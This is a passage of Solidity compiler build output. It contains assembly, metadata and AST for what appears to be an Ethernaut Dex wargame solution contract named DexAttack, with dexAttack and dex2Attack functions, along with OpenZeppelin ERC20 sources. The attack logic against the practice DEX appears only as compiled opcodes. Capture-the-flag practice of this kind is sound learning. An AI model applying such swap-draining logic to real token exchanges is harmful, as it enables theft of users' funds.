											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "158"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "tag",
											"source": 4,
											"value": "158"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "160"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "tag",
											"source": 4,
											"value": "160"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1293,
											"end": 1299,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1301,
											"end": 1307,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "DF791E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1283,
											"end": 1286,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1278,
											"end": 1292,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1278,
											"end": 1292,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "100"
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1293,
											"end": 1299,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1293,
											"end": 1299,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1293,
											"end": 1299,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1293,
											"end": 1299,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1301,
											"end": 1307,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1301,
											"end": 1307,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1301,
											"end": 1307,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1301,
											"end": 1307,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1309,
											"end": 1311,
											"name": "PUSH",
											"source": 4,
											"value": "2D"
										},
										{
											"begin": 1309,
											"end": 1311,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1278,
											"end": 1312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1278,
											"end": 1312,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 14,
											"end": 300,
											"name": "tag",
											"source": 5,
											"value": "8"
										},
										{
											"begin": 14,
											"end": 300,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 73,
											"end": 79,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 126,
											"end": 128,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 114,
											"end": 123,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 105,
											"end": 112,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 101,
											"end": 124,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 97,
											"end": 129,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 94,
											"end": 146,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 94,
											"end": 146,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "167"
										},
										{
											"begin": 94,
											"end": 146,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 142,
											"end": 143,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 139,
											"end": 140,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 132,
											"end": 144,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 94,
											"end": 146,
											"name": "tag",
											"source": 5,
											"value": "167"
										},
										{
											"begin": 94,
											"end": 146,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 168,
											"end": 191,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 168,
											"end": 191,
											"name": "CALLDATALOAD",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 220,
											"end": 251,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 220,
											"end": 251,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 210,
											"end": 252,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 210,
											"end": 252,
											"name": "EQ",
											"source": 5
										},
										{
											"begin": 200,
											"end": 270,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "168"
										},
										{
											"begin": 200,
											"end": 270,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 266,
											"end": 267,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 263,
											"end": 264,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 256,
											"end": 268,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 200,
											"end": 270,
											"name": "tag",
											"source": 5,
											"value": "168"
										},
										{
											"begin": 200,
											"end": 270,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 289,
											"end": 294,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": 14,
											"end": 300,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 300,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 305,
											"end": 689,
											"name": "tag",
											"source": 5,
											"value": "17"
										},
										{
											"begin": 305,
											"end": 689,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 572,
											"end": 587,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": 572,
											"end": 587,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 572,
											"end": 587,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 554,
											"end": 588,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 624,
											"end": 639,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 624,
											"end": 639,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 624,
											"end": 639,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 624,
											"end": 639,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 619,
											"end": 621,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 604,
											"end": 622,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 604,
											"end": 622,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 597,
											"end": 640,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 671,
											"end": 673,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 656,
											"end": 674,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 656,
											"end": 674,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 649,
											"end": 683,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 649,
											"end": 683,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 649,
											"end": 683,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 649,
											"end": 683,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 504,
											"end": 506,
											"name": "PUSH",
											"source": 5,
											"value": "60"
										},
										{
											"begin": 489,
											"end": 507,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 489,
											"end": 507,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 305,
											"end": 689,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 694,
											"end": 971,
											"name": "tag",
											"source": 5,
											"value": "21"
										},
										{
											"begin": 694,
											"end": 971,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 761,
											"end": 767,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 814,
											"end": 816,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 802,
											"end": 811,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 793,
											"end": 800,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 789,
											"end": 812,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 785,
											"end": 817,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 782,
											"end": 834,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 782,
											"end": 834,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "171"
										},
										{
											"begin": 782,
											"end": 834,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 830,
											"end": 831,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 827,
											"end": 828,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 820,
											"end": 832,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 782,
											"end": 834,
											"name": "tag",
											"source": 5,
											"value": "171"
										},
										{
											"begin": 782,
											"end": 834,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 862,
											"end": 871,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 856,
											"end": 872,
											"name": "MLOAD",
											"source": 5
										},
										{
											"begin": 915,
											"end": 920,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 908,
											"end": 921,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 901,
											"end": 922,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 894,
											"end": 899,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 891,
											"end": 923,
											"name": "EQ",
											"source": 5
										},
										{
											"begin": 881,
											"end": 941,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "168"
										},
										{
											"begin": 881,
											"end": 941,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 937,
											"end": 938,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 934,
											"end": 935,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 927,
											"end": 939,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 1463,
											"end": 1647,
											"name": "tag",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 1463,
											"end": 1647,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1533,
											"end": 1539,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 1586,
											"end": 1588,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 1574,
											"end": 1583,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1565,
											"end": 1572,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1561,
											"end": 1584,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 1557,
											"end": 1589,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 1554,
											"end": 1606,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 1554,
											"end": 1606,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "176"
										},
										{
											"begin": 1554,
											"end": 1606,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 1602,
											"end": 1603,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 1599,
											"end": 1600,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 1592,
											"end": 1604,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 1554,
											"end": 1606,
											"name": "tag",
											"source": 5,
											"value": "176"
										},
										{
											"begin": 1554,
											"end": 1606,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1625,
											"end": 1641,
											"name": "MLOAD",
											"source": 5
										},
										{
											"begin": 1625,
											"end": 1641,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 1463,
											"end": 1647,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1463,
											"end": 1647,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/ERC20.sol",
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol",
								"@openzeppelin/contracts/utils/Context.sol",
								"ethernaut/Dex.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"dex2Attack()": "3e50269c",
							"dexAttack()": "d7df8d6f",
							"setToken3(address)": "2216e590"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token2\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_dex\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"dex2Attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token3\",\"type\":\"address\"}],\"name\":\"setToken3\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut/Dex.sol\":\"DexAttack\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0xa56ca923f70c1748830700250b19c61b70db9a683516dc5e216694a50445d99c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cac938788bc4be12101e59d45588b4e059579f4e61062e1cda8d6b06c0191b15\",\"dweb:/ipfs/QmV2JKCyjTVH3rkWNrfdJRhAT7tZ3usAN2XcnD4h53Mvih\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"@openzeppelin/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]},\"ethernaut/Dex.sol\":{\"keccak256\":\"0x005c2545b7226992b52d6dd401e0be996968185b5792bd75d16bdc734d99d2a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://420b31223557e8ac558e3307cd42ea36049642a575bc8054930dcd3a5d760043\",\"dweb:/ipfs/QmUX5HCZMwYdSPpW4E1YCjsTyrpJtFFkLp4MWyZ2t1oMaY\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 727,
								"contract": "ethernaut/Dex.sol:DexAttack",
								"label": "token1",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 729,
								"contract": "ethernaut/Dex.sol:DexAttack",
								"label": "token2",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							},
							{
								"astId": 731,
								"contract": "ethernaut/Dex.sol:DexAttack",
								"label": "token3",
								"offset": 0,
								"slot": "2",
								"type": "t_address"
							},
							{
								"astId": 733,
								"contract": "ethernaut/Dex.sol:DexAttack",
								"label": "dex",
								"offset": 0,
								"slot": "3",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"IDex": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "swap",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"swap(address,address,uint256)": "df791e50"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut/Dex.sol\":\"IDex\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0xa56ca923f70c1748830700250b19c61b70db9a683516dc5e216694a50445d99c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cac938788bc4be12101e59d45588b4e059579f4e61062e1cda8d6b06c0191b15\",\"dweb:/ipfs/QmV2JKCyjTVH3rkWNrfdJRhAT7tZ3usAN2XcnD4h53Mvih\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"@openzeppelin/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]},\"ethernaut/Dex.sol\":{\"keccak256\":\"0x005c2545b7226992b52d6dd401e0be996968185b5792bd75d16bdc734d99d2a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://420b31223557e8ac558e3307cd42ea36049642a575bc8054930dcd3a5d760043\",\"dweb:/ipfs/QmUX5HCZMwYdSPpW4E1YCjsTyrpJtFFkLp4MWyZ2t1oMaY\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/ERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/ERC20.sol",
					"exportedSymbols": {
						"Context": [
							711
						],
						"ERC20": [
							586
						],
						"IERC20": [
							664
						],
						"IERC20Metadata": [
							689
						]
					},
					"id": 587,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "105:23:0"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "./IERC20.sol",
							"id": 2,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 587,
							"sourceUnit": 665,
							"src": "130:22:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol",
							"file": "./extensions/IERC20Metadata.sol",
							"id": 3,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 587,
							"sourceUnit": 690,
							"src": "153:41:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "@openzeppelin/contracts/utils/Context.sol",
							"file": "../../utils/Context.sol",
							"id": 4,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 587,
							"sourceUnit": 712,
							"src": "195:33:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"baseName": {
										"id": 6,
										"name": "Context",
										"nameLocations": [
											"1550:7:0"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 711,
										"src": "1550:7:0"
									},
									"id": 7,
									"nodeType": "InheritanceSpecifier",
									"src": "1550:7:0"
								},
								{
									"baseName": {
										"id": 8,
										"name": "IERC20",
										"nameLocations": [
											"1559:6:0"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 664,
										"src": "1559:6:0"
									},
									"id": 9,
									"nodeType": "InheritanceSpecifier",
									"src": "1559:6:0"
								},
								{
									"baseName": {
										"id": 10,
										"name": "IERC20Metadata",
										"nameLocations": [
											"1567:14:0"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 689,
										"src": "1567:14:0"
									},
									"id": 11,
									"nodeType": "InheritanceSpecifier",
									"src": "1567:14:0"
								}
							],
							"canonicalName": "ERC20",
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 5,
								"nodeType": "StructuredDocumentation",
								"src": "230:1301:0",
								"text": " @dev Implementation of the {IERC20} interface.\n This implementation is agnostic to the way tokens are created. This means\n that a supply mechanism has to be added in a derived contract using {_mint}.\n For a generic mechanism see {ERC20PresetMinterPauser}.\n TIP: For a detailed writeup see our guide\n https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n to implement supply mechanisms].\n The default value of {decimals} is 18. To change this, you should override\n this function so it returns a different value.\n We have followed general OpenZeppelin Contracts guidelines: functions revert\n instead returning `false` on failure. This behavior is nonetheless\n conventional and does not conflict with the expectations of ERC20\n applications.\n Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n This allows applications to reconstruct the allowance for all accounts just\n by listening to said events. Other implementations of the EIP may not emit\n these events, as it isn't required by the specification.\n Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n functions have been added to mitigate the well-known issues around setting\n allowances. See {IERC20-approve}."
							},
							"fullyImplemented": true,
							"id": 586,
							"linearizedBaseContracts": [
								586,
								689,
								664,
								711
							],
							"name": "ERC20",
							"nameLocation": "1541:5:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 15,
									"mutability": "mutable",
									"name": "_balances",
